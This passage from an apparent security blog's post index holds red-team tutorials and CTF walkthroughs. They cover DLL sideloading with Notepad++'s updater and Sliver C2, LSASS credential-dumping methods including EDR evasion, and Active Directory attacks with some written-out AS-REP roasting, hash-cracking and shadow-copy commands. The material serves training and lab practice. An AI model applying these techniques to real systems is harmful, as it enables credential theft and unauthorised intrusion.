goes like this Find a vulnerable DLL using Procmon Create a shellcode Create a proxy DLL of the original legitimate DLL Upload them to the machine and execute themFinding Vulnerable DLLsAs mentioned before it wass more of a trial and error for me but eventually I chose the Notepad++ program. In the updates directory, I found a GUP.exe binary which also reminded me of a DLL Sideloading article I read a while ago so I went with this. To find the DLLs we can utilize we use Procmon with the following filters.Among these we can select one DLL. The smaller the better. In this case ncrypt.dll is smaller so we will be going with it. These DLLs can be found in C:\\Windows\\System32\\ folder for x64 bit machines. But due to search order system in Windows they look for the DLLs in the current directory first. In the next step we will copy this DLL to our dev workstation to buld a proxy DLL.Building a Proxy DLL and Using Sliver C2For the dev workstation I use Commando VM. You can get it from here. After copying the DLL here we are going to use Flangvik’s tool SharpDLLProxy which we can use to create a proxy DLL. After cloning the repository build it with Visual Studio. While it’s building it we can go ahead and get our shellcode ready.For this I am going to use Sliver C2. It’s the new hotshot in town, everyones been talking about it and I’ve been using it for a while now. It’s really impressive with a lot of features in it. You can get it from here and read the documents to see what interesting measures it has. I’ll be using it to create the shellcode file. First we need to start a listener and then generate the shellcode.The payloads by sliver by default can be really big. In these cases we would idealy be using stagers to keep the size to minimum. However right now I’ll just be continuing with the defaults. We can now send it over to our dev workstation. I renamed the payload to payload.binAfter sending it over we can now use SharpDLLProxy.exe to build a proxy DLL.This outputs 2 files for us according to the photo. tmpCA21.dll = The original legitimate DLL ncrypt_pragma.c = The DLL that will execute the shellcode and forward the calls to original DLLYou can rename the tmp DLL to something sneaky but I’m going to keep it as it is. Next step is to build the C file we have for our sideloading DLL. Open Visual Studio and Select Dynamic Link Library for C++. Make sure to name the project with original DLL name. In our case it will be ncryptCopy the contents of ncrypt_pragma.c to dllmain.cpp and build it. In case you’re wondering how this works, the DLL we create is going to use pragma comments and linkers to forward the calls to the legitimate DLL.We can see our tmp DLL which the calls will be forwarded to.Then it reads our payload and executes it. We can build it now. This will give us a ncrypt.dll. Now we have all the contents, lets move to exploitaiton.ExploitationNow we can move the files over to the target VM. We know that the path it looks for the DLL is C:\\Program Files\\Notepad++\\updater so we will be dropping three files here tmpCA21.dll = The original legitimate DLL ncrypt.dll = The proxy DLL we created payload.bin = Our payload shellcodeAfter moving them over, we can now execute the GUP.exe and see the shell call back to our sliver C2.And we have a shell on a fully patched Windows computer with Defender enabled. Obviously this can be improved a lot. It could be more stelthier, more APT like. For that I would recommend going through this blog as it mimics the exact ways APT29 works with this.The DifferencesThe difference between this one and APT29 one is the fact that we cant actually use it anywhere. Ideally, like APT29, we would be looking for standalone executables. In our case GUP.exe wont work if its not in that folder. Secondly, this method is more like explaining how DLL Sideloading works. We would be needing to create a good delivery mechanism like APT29 uses ISO, to make this attack more real life compatible.ReferencesHope you guys learned something new. Let me know what you think. You can always contact me through methods in the left side bar. DLL-Sideloading Hijack Execution Flow: DLL Side-Loading DLL Side-loading: A Thorn In The Side Of The Anti-virus Industry Recreating an ISO Payload for Fun and No Profit When Pentest Tools Go Brutal: Red-Teaming Tool Being Abused by Malicious Actors" }, { "title": "Blackfield - HackTheBox Walkthrough", "url": "/posts/blackfield-HackTheBox/", "categories": "", "tags": "Write-Ups", "date": "2022-07-17 00:00:00 +0500", "snippet": "IntroductionThis box is a hard difficulty box which has active directory installed made by aas.This box starts with username enumeration to ASREP Roasting which gives us one user’s hash. Cracking it and dumping bloodhound with it. Then moving to a new user which has access to a forensic share which contains lsass dump. We parse it to find another user’s hash which gives us a shell on the machine. That user has some vulnerable backup privileges which we can exploit and get administrator access on the machine. Let’s see how its done.EnumerationNmap scan shows us the followingNmap scan report for 10.129.97.156Host is up, received echo-reply ttl 127 (0.71s latency).Scanned at 2022-05-29 08:44:58 PKT for 172sPORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-05-29 10:45:07Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 127593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.03268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 6h59m58s| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required| smb2-time: | date: 2022-05-29T10:45:39|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 23438/tcp): CLEAN (Timeout)| Check 2 (port 41123/tcp): CLEAN (Timeout)| Check 3 (port 42695/udp): CLEAN (Timeout)| Check 4 (port 35589/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blockedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun May 29 08:47:50 2022 -- 1 IP address (1 host up) scanned in 173.13 secondsWe can see the usual active directory ports open. We can also identify the domain as blackfield.local which we can add to our /etc/hosts file. Going through my usual way we can see if RPC returns anything for anonymous login.This returns nothing. We can move over to DNS enumeration by using the domain we found earlier to see if we can leak some other domains.We can see the dc01 domain which confirms this is a domain controller we are working with. To also confirm the domain we can use LDAP queries. Sometimes the anonymous LDAP queries also reveal information about the users and the machines.Now we can go ahead and look at the shares we have available. We see 2 shares with read-only access. IPC and Profiles. If I see IPC share with read-only access I use the lookupsid.py from Impacket to see if we can perform bruteforcing of Windows SID’s to identify users/groups on the target machine.This dumps a lot of usernames with the foramt of BLACKFIELD{some numbers}. My guess is that these accounts were generated through some script. Although we shouldn’t be ignoring them because they might have some good stuff as well but for now lets remove them and generate a list of usernames we think are fit.After getting rid of the groups and other junk we get these usernames. Now we can look at the profile share. Looking at it we can see that it contains folders of usernames with nothing in them. We can get it directly from SMB but these huge files mess with me when I try to get them. So we can mount the shares and then copy them. A technique I saw from 0xdf’s blog here.Another thing I picked up from the blog is we can list the directories in one line using ls -1We can add them to the wordlist of usernames we have from IPC to see if any of these may work.Now we can check which one of these exist by using kerbruteThere are 3 duplicates which I believe are the ones from the profile share. So we the usernames from IPC are valid and only ones we have working.ExploitationWith the usernames in hand we can go ahead and do ASREP Roasting to see if we can get any users that dont require preauth which can give us their hashes. I’ll be using GetNPUsers.py in a one liner I found from 0xdf’s blog post to see if we get any hashes back.for user in $(cat creds-from-ipc.txt ); do GetNPUsers.py -no-pass -dc-ip 10.129.135.182 blackfield.local/${user} -format hashcat | grep -v Impacket; doneAnd we find a hash for the user support. We can save it to a file and crack it using hashcat or John.hashcat -m 18200 support.asrep ~/Desktop/rockyou.txtjohn --format=krb5asrep -w=~/Desktop/rockyou.txt support.asrepAnd we find a password. We can then try to use it against the services that can give us a shell like SMB and WinRM.None of these say pwned! which is when you now you can crack a shell on the machine. SMB also shows NETLOGON and SYSVOL are new only which dont have anything good in them either. Tried RPC and Kerberoasting but no luck. After stumbling on it for a while I thought of running bloodhound to see anything new we can find.If we look at the Outbound Control Rights we can see that we have the ForceChangePassword authority over the user audit2020. Which means we can change its password.We can use RPC and its command setuserinfo2 to change the password of audit2020. There’s this blog that mentions how we can do that. Following it:We can test if we have access to services and the shares we can see now again.We can see a new share forensic appearing. Let’s see what it has.It contains 3 different folers. We can get it again using mount to see what these have.After some looking around I found a lsass.zip in the memory_analysis folder which seems interesting. After unzipping it I found a dump file of lsass process which we can parse using pypykatz on our machine. I wrote a blog detailing methods to dump lsass process if youre interested you can read it here.And we can find another hash for user svc_backup. Testing it with the usual services and we can find that we can open a shell using WinRM.And we found user.txt.Privilege EscalationFor privilege escalation we can first check what privileges does this user have.We can see that there are backup privileges enables on this user. And we can find this article that explains how this privilege is vulnerable. As ARZ tipped me, we can extract the ntds.dit file with this. The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups and group membership. To get it working we need the SYSTEM registry file as well. To get the SYSTEM file we can use reg save and then we can transfer them over using SMB.To get ntds.dit we will need to create a shadow copy of the C:\\ directory which we can then use to get out ntds.ditGot this script from the blog which creates a backup of the C:\\ volume and names it E:\\ and uploaded it to C:\\Windows\\Tempset verbose onXset metadata C:\\Windows\\Temp\\meta.cabXset context clientaccessibleXset context persistentXbegin backupXadd volume C: alias cdriveXcreateXexpose %cdrive% E:Xend backupXUsed diskshadow utility to make a shadow copy using this script.Now we can use robocopy to copy the ntds.dit file from this copy we created to our share.It takes a while but after some time we get it in our machine and we can use secretsdump.py to parse it to get hashes. The results contain a lot of junk but we find our admin hash as well.We can test the hash out using crackmapexec. Both SMB and WinRM show pwned! which means we can use evil-winrm or tools like psexec.py to get a shell. Easiest it WinRM so we can login and get root.txt.Let me know if you would like to add something or give suggestions. You can contact me using the socials in the sidebar. Thanks!!" }, { "title": "Ways to Dump LSASS", "url": "/posts/Dumping-Lsass/", "categories": "", "tags": "Red Team", "date": "2022-07-16 00:00:00 +0500", "snippet": "IntroductionIn this post we are going to look at the methods we can use to dump LSASS. According to wikipedia “Local Security Authority Server Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system.”Basically, it stores the local usernames and passwords/hashes in it. So dumping this is one of the common things adversary and red teamers do. We can see the ways to dump it with and without the use of mimikatz.MimikatzMimikatz is a very popular post exploitation tool which can be used to dump the lsass process and extract NTLM hashes from it.First we can use the sekurlsa::logonPasswords if we are working with an old Windows machine. In the newer Windows versions we can not extract the plain text passwords.This dumps a lot of information but we can see the values of WDigest passwords are empty. Which can mean that the Windows version is new. But the NTLM hashes do get dumped.We can also use the lsadump::lsa /patch module to dump all the hashes from LSASS including the user accounts that were not dumped in logon passwords before.We can test the hashes or we can use hashcat to crack themTask ManagerBet you didnt knew task manager can be used to do something other than killing chrome did you? We can use it to create dump files of the lsass.exe process which we can then parse locally to extract passwords. Here’s how. First you locate the process and right click it and create a dump file.The dump file usually gets written to C:\\Users\\Administrator\\AppData\\Local\\Temp. Once you retrieve it you can use tools like pypykatz or mimikatz itself to dump the hashes.To parse this using mimikatz we can use thisMicrosoft Signed ToolsFortunately, Task Manager isnt the only Microsoft Signed binary we can use to dump lsass. We can use Procdump, ProcessExplorer, ProcessHacker etc. to dump lsass too. Ill show you how to do it using Procdump and leave the rest as a challenge for you.When it comes to procdump there are different ways you can dump the lsass process. Here’s the most basic way to do it.We can dump it by using a cloned process usingIt can be done with using the process ID like thisWe can use procdump to dump in a external share of ours as wellAfter these dumps we can use the same methods to parse these and extract credentials as mentioned before.CrackmapExecWe can use crackmapexec to dump lsa secrets remotely as well.ComsvcsWe can use native comsvcs.dll DLL to dump lsass process using rundll32.exeMini-DumpWe can use the Powersploit module Out-Minidump.ps1 to dump lsass as well. DumpertFor more opsec safe and AV Bypassing dumping of lsass we can use the dumpert project by Outflank. It uses syscalls to avoid API hooking which can bypass some AVs/EDRs.Theres two versions of it. A DLL and an executeable. Here’s how we can use them.ReferencesThese are just some of the ways we can use to dump lsass without using mimikatz or any C2. Some other cool methods can be found here by s3cur3th1ssh1t which are more opsec and AV/EDRs bypassed focused. IRed.Team WhiteOakSecurity MarkMorig" }, { "title": "Resolute - HackTheBox Walkthrough", "url": "/posts/Resolute-HackTheBox/", "categories": "", "tags": "Write-Ups", "date": "2022-03-23 00:00:00 +0500", "snippet": "IntroductionHello again. Today I will be looking into a medium box based on active directory from HackTheBox made by egre55. This box starts with an easy foothold. The password is retrieved from RPC which gives us initial access. Then we move over to ryan user which is a part of DNS Admins group that has a priv esc route. Lets get into it.EnumerationNmap scan shows a lot of ports open. But the noteable ones are, DNS, WinRM, LDAP, And a bunch of RPC ports showing that it may be a domain controller. For a full port scan list you can refer to this.So first lets enumerate LDAP and see if we can leak some information about the machine.It outputs a lot of information but the important one is that it gives us a domain name. We can add it to our /etc/hosts file. I tried looking for other domain names but no luck.Now we can enumerate RPC and see if that leaks any information.And it works! We have a list of users we can save. We can look at the groups too.We see all the normal ones except the “Contractors” group. Lets see whose part of that group.We see it only has one member Ryan Bertrand. Its good to keep it in the back of your head.Now another thing we can do is display decription of user accounts. Maybe they contain passwords? Lets see.And we do have it! We can use the list of users and this password to do password spraying and see it if actually gets us access into anything. I’ll use CrackMapExec for that.Okay so after many errors we have one user. But it doesnt say pwned. Which means we can use something like psexec to get a shell in it. But we do have WinRM open on the box. We can try that using crackmapexec too.We got it! We get the pwned sign which means we can get a shell now using Evil-WinRMFirst thing we can look for is user.txt and retireive it. Lets look into users that have a home directory.And we have ryan user. Which makes me wonder maybe we’re supposed to escalate to this user before actually getting root. After several rabbit holes I used the command that shows the hidden files in powershell. And I found a folder named PSTranscripts.I used the WinRM’s download feature to get the powershell script I found.And we find a password for ryan user.We can use it to get a shell using WinRM now.Now we can see the permissions and privileges the user Ryan has.We have the user ryan in the DNS Admin group. Which can be vulnerable and is explained in this article. So following the steps, we can try to escalate our priviliges to administrators. Making the malicious DLL and staring a SMB Server.Now we can inject the DLL and restart the service to see if we can get a shell back.And just like that we’re ROOT!! We can now get the root flag and submit it!If you have suggestions or if you wanna talk about anything. Contact me from the info in the footer. Till next time!" }, { "title": "Funbox Part 4", "url": "/posts/Funbox-Part-4/", "categories": "", "tags": "Write-Ups, Funbox Series", "date": "2021-08-28 00:00:00 +0500", "snippet": "IntroductionThis box is the 4th part of boxes in a series named as Funbox. You can find the series here and if your’e looking for this paticular box, here. This one is also made by 0815R2d2.This one starts out with a robots.txt file with a hidden directory. Which has upload functionality that takes our shell and gives us access in the machine. The root path is linux kernel exploitation. Let’s see it through.EnumerationStarting out with the port scan:rustscan -a 192.168.57.45 -r 1-65530 -- -A -sC -vvv -oN initialNot putting the whole output because it feels messy but these are the ports that were open:22\t\tssh\t\tOpenSSH 7.2p2 Ubuntu 480\t\thttp\tApache httpd 2.4.18110\t\tpop3\t\tDovecot pop3d143\t\timap\t\tDovecot imapdOkay so let’s see. We have SSH which we noramlly wouldn’t look into because it’s usually clean and not the initial foothold method. In any other case, you should actually looks into it because this may lead to some information disclosure. Let’s start with port 80. It has a default Apache web page. Directory bruteforcing wasn’t getting me anywhere either. I tried looking at robots.txt, nothing ther either. I tried robots.txt but in all uppercase as, ROBOTS.TXT, and found the robots file.But looking into ‘upload/’ dir didn’t gave me anything. So I took another look at the source code of robots file, and saw a hidden directory at the very end.going into this directory shows a 403 Forebidden. But we could try a directory scan in here.And we can see the upload directory which we saw earlier in robots file right here. Along with a couple of upload pages. Let’s go to the first one and try to upload a shell.And it looks like our shell was uploaded. So we know we can’t view the uploads dir, but we can try to go to the ‘/upload/shell.php’ and see if we get a call back.And we get a shel in here! If you’re wondering what Pwncat is, it’s an amazing tool for reverse shells. I wrote a bit on it in the previous blogpost here.Back to the box. For some reason, linpeas or linenum wasn’t working for me. So I tried to look for kernel versions to see if we can find an exploit for it. And I indeed did find it. Here was the exploit for it, CVE-2017-16995. After compiling it I uploaded it on the machine and executed it.And yes we get root! Don’t mind the partially broken shell. We can go get the root flag.Let me know if you have any suggestions for the blog or anything. My contacts are in the footer. I’ll see you in the next one!" }, { "title": "Doc - HackMyVM", "url": "/posts/Doc-HackMyVM/", "categories": "", "tags": "Write-Ups", "date": "2021-08-27 00:00:00 +0500", "snippet": "IntroductionThis is an easy room on HackMyVM made by sml. You can find this room at Doc - HackMyVM.This is a simple machine that has a web server using a vulnerable program that we can exploit to gain a initial foothold. The root part after it was pretty cool. I admit I also had to ask for a nudge to look at it clearly which helped me exploit it and get a root shell. Let’s walk down the lane and see how it works.Enumeration80/tcp open http syn-ack nginx 1.18.0Okay so all we see is one port which is 80 open and it has a website on it. Going over to the actual website, we see this.ExploitationSo its using Online Traffic Offense Management System - PHP on the website. We can look for exploits that might have been available on google. And we find a Unauthenticated RCE exploit on the same app. Couldn’t get more better than this.Also by going to the Login page on the Vulnerable website, We can see that it points to a domain “doc.hmv”. We can add it to our /etc/hosts. Now let’s run the exploit.And here it is. We have what seems like a webshell on the box. Let’s get a pty shell going on so we can stablize it and work with it.So I dont know if you’ve heard of it, but there’s this really amazing tool called Pwncat which is made by Caleb Stewart and John Hammond and trust me, it is absolutely beautiful. Makes you life hella easy. It automatically stablizes the shell and makes upload and downlaoding from the connected machine a lot easy. It has alot of other features as well. I would suggest you watch this video in which both Caleb and John present Pwncat to get a better insight in the power of the tool, Introducing Pwncat: Automating Linux Red Team Operations. Okay back to the box.I used the great Revshell website to generate a Python3 reverse shell.And we recieve a shell back to our pwncat.Okay so from here on we can use CTRL+D to interact with the active session. We have www-data user and th eother user is bella. We can upload the linpeas binary to get a good look at what we can use for our advantage. Just to show you how easy it is to upload linpeas I’ll upload it in the /tmp directory.(Garry says ignore the typo or I’ll steal your lunch money) I got a new keyboard I’m still trying to get used to it.The linpeas output shows the user bella’s SQL Password.I thought to try it as the user password as well and We get in the user bella!Privilege EscalationFrom here on we can use sudo -l to see what we can run as root. And we see a weird binary doc that we can run.When we run it, I couldn’t see anything that might resemble this program. It was seemingly running a webserver locally on port 7890 with only 2 options. Either browse or quit. It didn’t make sense. I tried to curl it after running the webserver to see what it actually serves. It was some sort of Pydoc’s Index of Modules. And I was stuck. I asked in the Discord for a nudge and the creator of the box sml suggested to check for strings in the program to see what is actually doing.This made everything clear. I found that the command it was running was ‘PyDoc3.9 -p’.And a simple Google search led me to this article CVE-2021-3426: Information disclosure via pydoc -p. This explains how “/getfile?key=” parameter is vulnerable and other users can see arbitratry files on the server.So I used curl to get the root flag using the same method.And we can see the Root Flag in the HTML.And we’re done! It was a pretty good box with a nice way to root. As always let me know if you have suggestions for the blogs or if you just wanna talk about anything. My contact info is in the footer. Till next time!" }, { "title": "Funbox Part 3", "url": "/posts/Funbox-Part-3/", "categories": "", "tags": "Write-Ups, Funbox Series", "date": "2021-08-22 00:00:00 +0500", "snippet": "IntroductionPart 3 of a series of machines Funbox, which can be found here created by 0815R2d2.This is also a boot2root machine with a lot of rabit holes and can really cause a headache if you’re too focused. But fortunately didnt happen with me by chance. Starts off with a book store what has default creds and a shell being uploaded to the website. Getting in it was pretty easy to get SSH access as user and then ‘sudo -l’ gives off privilege escalation tricks. Let’s go.EnumerationUsing rustscan for port scan:rustscan -a 192.168.57.36 -r 1-65530 -- -A -sC -vvvNot putting the whole output because it feels messy but these are the ports that were open:22\t\tssh\t\tOpenSSH 8.2p1 Ubuntu 4ubuntu0.180\t\thttp\tApache httpd 2.4.4133060\tsql\t\tmysqlxThe HTTP website also hints at ‘/gym’ directory which is in robots.txt. But just to be going through my methodology I’ll start a gobuster scan as well.The website shows a default webpage of apache. But my directory scan shows a lot more.ExploitationOkay there’s a lot to go through. But I started with the obvious ones first. ‘/admin’ looks good. Looked around, tried some default passwords. Nothing worked. Okay instead of wasting time here, let’s move on. ‘/secret’ seems sus. But it did’nt have anything other than a quote. We already know what robots.txt has. And I thought that obviously this looks like the only good way of entry. So let’s eliminate the others first. MOving on to ‘/store’, there is a admin login page as well. Tried default password of ADMMIN:ADMIN and oh we’re in!By looking at what we can edit in a book, I found that we can also add a image as book cover. Hmm.. Does it take anything other than a image? Let’s upload a reverse shell php and test it.Ooop. Looks like it worked. To find where exactly did it go, I tried to view the image of any other book cover and found it.And it gave us a shell.Spawning a PTY Shell and stablizing the shell for better viewingLooking around I found a tony directory in home directory. Which contained a ‘password.txt’ file. And this file contained SSH password for the user tony.Privilege EscalationSo we SSH into the Tony user and use the command ‘sudo -l’ to see what this user can run as sudoOkay we have a lot of things here. The best one that I see first is ‘pkexec’. I have done this before and I know how we can use it to gain a root shell. Using the same method.And just like that this really easy machine is pwned. I’m glad I didn’t go through the robots.txt rabbit hole becasue I know I would have wasted a lot of time on it. But anyways Part 3 is done. I’ll see you in the next part. And as always if you ever need to contact me my contacts are down in th e footer below." }, { "title": "Funbox Part 2", "url": "/posts/Funbox-Part-2/", "categories": "", "tags": "Write-Ups, Funbox Series", "date": "2021-08-18 00:00:00 +0500", "snippet": "IntroductionThis is another easy rated box from Vulnhub created by 0815R2d2. Its the second part of a series of boxes called Funbox. Heres a link to this one and you can find the series on this page too: Funbox 2.Its a simple machine that starts off with a lot of work. This box is fairly easy and doesnt take long once you get through the initial part. You’ll know what I’m talking about. After getting initial foothold you find the password for the user and then the classic ‘sudo -l’ process to get to root. Let’s begin!EnumerationAs usual starting with the port scan we use Rustscan to scan the machine for open ports and we can find 3 ports open. 21 for FTP, 22 for SSH and 80 for HTTP.rustscan -a 192.168.57.30 -r 1-65530 -- -A -sC -vvv PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ProFTPD 1.3.5e| ftp-anon: Anonymous FTP login allowed (FTP code 230)22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD| http-robots.txt: 1 disallowed entry |_/logs/|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksSo let’s start with the obvious FTP which has Anonymous Login enabled.We have a lot of zip files with random usernames available.If we see the hidden listings as well, we can find a ‘.@admin’ file among them.The file was encoded in base 64 so I used the Base64 command to decode it.And this where the work begins… I don’t know if there was a way to make it easier or not, but I tried unzipping the zip file, then when it wasn’t working used zip2john to get a hash and then tried to crack the hash using John the Ripper and Rockyou.txt. And I repeated it with every single one of them.. And the funny thing is, I didn’t do it in order I was going randomly choosing. And I chose the one that actually work in the very last smh…Here is it if it saves some time for you.ExploitationWe get a id_rsa file. Change the permissions on the file and then use it to login to SSH to get initial foothold.And look what we get here. A ristricted bash shell. Just like in the last box. Used the same command as the last one to break out of it.After this the very first thing I did was look if we have a hidden file in our or if there is another user’s directory. And I see something odd. The MYSQL_History file. I did ignore it for the first time and ran Linpeas around. But when I did’nt see anything good, went back the the history file and sure enough we found a clear text password in there.Privilege EscalationTo make it clear, the password is whatever is in read. the 040 is not in the password.After getting the password I ran the classic ‘sudo -l’ to check sudo permissions and woah.. this guy can run any and all commands as root which makes it very easy for us. ALl we need to do is;And just like that we rooted yet another Funbox Series Machine. Let me know if you liked it or want to give suggestions about the blog. Everything is welcomed. My contacts are in the footer right there. See you in the next one!" }, { "title": "Funbox Part 1", "url": "/posts/Funbox-Part-1/", "categories": "", "tags": "Write-Ups, Funbox Series", "date": "2021-08-14 00:00:00 +0500", "snippet": "IntroductionThis is a box rated easy from Vulnhub released on 20-Jul-2020, created by 0815R2d2. Its a part of a series of boxes called Funbox. Heres a link to this one and you can find the series on this page too: Funbox 1.The machine is a boot2root type machine in which we start from a simple user gained through bruteforce and move to another user to find a way to root a box. Pretty fun box. Learned a lot. Very good for beginners. Let’s get to it now shall we?EnumerationSo I was trying to do a complete enumeration on this box and try to find as many exploitation ideas I could get. Let me walk you through the process..Starting with the obvious port scan. I used Rustscan by the very best Bee-Sec-San to do the port scanning because its pretty fast. You can get it from here. Here’s the command I used:rustscan -a 192.168.57.22 -r 1-65530 -- -A -sC -vvv PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ProFTPD22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.080/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry|_/secret/|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://funbox.fritz.box/33060/tcp open mysqlx? syn-ackI found 4 Ports open. Port 21 for FTP, Port 22 for SSH, Port 80 for HTTP, Port 33060 for MySQL.And from here I started to enumerate each service one by one. Starting by FTP.I tried Anonymous Login first but it was disabled.Next I tried finding the version of FTP so we could look for exploits if available. I found that Metasploit has a auxiliary module for it.So I ran it to see for FTP Version information.Hmm.. Looks like we don’t get much information here. Let’s move to SSH for now.So our scan results show that OpenSSH Version 8.2p1 is being used. Let’s look it up searchsploit.Didn’t find anything that looks interesting.Moving over to Port 80 which has a website hosted. Found a WordPress website.We also found the same URL we had seen in the Nmap scan results if you looked closely. Time to add it up in the /etc/hosts file of ours.Um.. I’m not sure if adding all the possible variations of the somain is good practice or not. I’m a noob. Maybe ask Google about this more before following as I will do the same as well.So it being a WordPress website let’s run a wpscan and see what we have here.And while the wpscan is running, let’s go ahead and check that robots.txt file we saw earlier in our port scan. You may or may not have missed it. But it was here.Visiting the robots.txt shows us a /secret/ directory being disallowed. This looks very good.Lets try to see what it is.Okay that was nothing. I still looked around but found othing. Just a rabbit hole.Okay back to the WPScan. The scan gave out 2 usernames. Joe and Admin.ExploitationWe can use this to perform a bruteforce attack againt the two users. I ran them one by one but it’s possible to do 2 at the same time. Starting with the user Joe. Used the RockYou.txt as a wordlist and got the results.And we got a hit. The user Joe’s password.(I accidently deleted the photo so used this editing photo XP)Logged into Wordpress and saw that the user Joe has very limited access.Started looking for vulnerabilities I could find for the WordPress version. At the same time I also started running another bruteforce attack on the user admin using the same wordlist.Couldn’t find anything on the Wordpress version but we actually got a hit on the admin user on bruteforce.So logged in using admin credentials. Tried to upload the reverse shell in 404.php page. But I couldn’t.So at this time I thought about Password Reusing. Maybe either Admin’s or Joe’s password is also being used at the SSH Service? Well I tried the user Joe with his password. And I got in.Coming in tried to go a directory back and see what other users we may have. But this was a restricted bash shell.Could confirm this using:I used pyhon to spawn another shell as bash and escape the rbash shell. Using this command:Okay so now we can look around. In our hone directory I couldn’t find anything.I tried to do a ‘sudo -l’ to see if we have something in the sudoers file. No luck.So I looked at the /etc/passwd file to see what other users we might have.Privilege EscalationOkay so we have another user ‘Funny’ with their own home directory. Let’s look what we have in there. And we can see a backup script in there.Okay so anyone can read, write and execute this file. That’s good. We can upload a reverse shell in there and see if we get a call back. But we need to be sure if we will be getting a call back. I cant see the cronjobs from this user so we will put pspy64 binary on the machine and see if there’s something worth our while.Wait thats strange. It confirms that there is a cronjob running. But looking at this, it looks like the cron job is running once with UID:1000 and once with UID:0. Which means its running once with user funny as once as root user.This means if we wait after uploading our shell, we can get root access. Let’s test this out. First to generate a reverse shell, I’ll be using the Revshells Website by the very talented and awesome Ryan Montgomery.Pretty easy when using the website. Okay so we write it to the backups script.And now we wait. After about 2 minutes and a couple of tries.. We got ROOOT! We finally successfuly pwned the box.Let me know if you liked it. My contacts are in the footer. Hope you enjoyed. All criticisms are welcomed btw. Let me know how I can make it better. Will be continuing this Funbox Series in the future (hopefully). See you in the next one!" }, { "title": "Overpass 2 - Hacked", "url": "/posts/Overpass-2-TryHackMe/", "categories": "", "tags": "Write-Ups", "date": "2021-08-03 00:00:00 +0500", "snippet": "IntroductionThis room is created by NinjaJc01 and focuses on PCAP Analysis and Forensics side. Here’s a link to the Room: Overpass 2 - Hacked. Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.Can you work out how the attacker got in, and hack your way back into Overpass’ production server?So this hints what we would have to do. Analyze a PCAP and retrace the steps to get back in the server.AnalysisWe start with a PCAP File. We can analyze this file using Wireshark Tool. Lets fire it up.The first question we get is: What was the URL of the page they used to upload a reverse shell?To see the URL to which the shell was uploaded we can see the requests made using this wireshark filter:With this we can see the requests made to the website and also where the shell was uploaded.We will have the answer to our first question right here. What payload did the attacker use to gain access?This can also be found in the same filter. Look for a POST Request. And from there see at the data that was uploaded. You can see the payload that was used for initial access. What password did the attacker use to privesc?To see more information on the pcap, We can look for “tcp.eq.stream == 3” .From here just do “Follow TCP Stream” or CTRL+SHIFT+ALT+T to follow the TCP Stream. You can see the password used by the attacker by analysing the TCP Stream. How did the attacker establish persistence?Using the same TCP Stream, We can find the backdoor that the attacker used and what the code is. Using the fasttrack wordlist, how many of the system passwords were crackable? Just above this we can see that the attacker dumped the shadow file. We can see the hashes of 5 users. We can use John to crack these hashes from the fasttrack.txt wordlist as asked in the Task.ResearchIn this section we are supposed to research the code that the attacker used to gain persistence on the server. We already have the link so we can just clone the repository on our local machine to research the code. What’s the default hash for the backdoor?We can open up sublime or any other text editor you prefer to read the code. GO Language is a programming language but you dont need to have programming knowledge to read the code and answer the questions. When we open it we can see the default hash right away. What’s the hardcoded salt for the backdoor?At the very end of this program, we can see the salt used for the backdoor. What was the hash that the attacker used? - go back to the PCAP for this!To get the answer of this we need to go back to the PCAP File. Right where we left. At the part where the attacker set the persistence up. We can see what salt he used. Crack the hash using rockyou and a cracking tool of your choice. What’s the password?Okay sow let’s get cracking. We can use Hashcat to crack this hash. This is a SHA-512 hash. And we have the salt as well. So we will append the salt next to the hash so it appears liken this ”&lt; hash &gt;:&lt; salt &gt;”. Now we can use Hashcat on it. I already ran it so I’m adding the –show tag in it as well. You dont need to use it.AttackOkay so we have enough information now. We can use the information we gathered to get back in the server. Lets get to the tasks of this section. The attacker defaced the website. What message did they leave as a heading?Remember what we did in the Task 2? I did the same again and got a request to “Index.HTML”. In it we can see what the hacker wrote on the website. (Easy solution is to go to the address and see the website in browser ;) ) Using the information you’ve found previously, hack your way back in!We know that the attacker uploaded a backdoor on SSH. We can use the sam eto get back in again. We already cracked the password used to setup the backdoor. Also a thing to note, when we see the hash in Task 1 of Section 2, we can see the port that is being used for the backdoor. Its on Port 2222. Lets get in the server. What’s the user flag?And we’re in! Let us get the User Flag. What’s the root flag?We can see a file using SUID Permissions in the user’s home directory.Searching about it on GTFOBins, we can see this paaragraph that gives us a hint on how to exploit it.So we use this “-p” flag and see if we can get a root shell.Aaand we’re ROOT! The 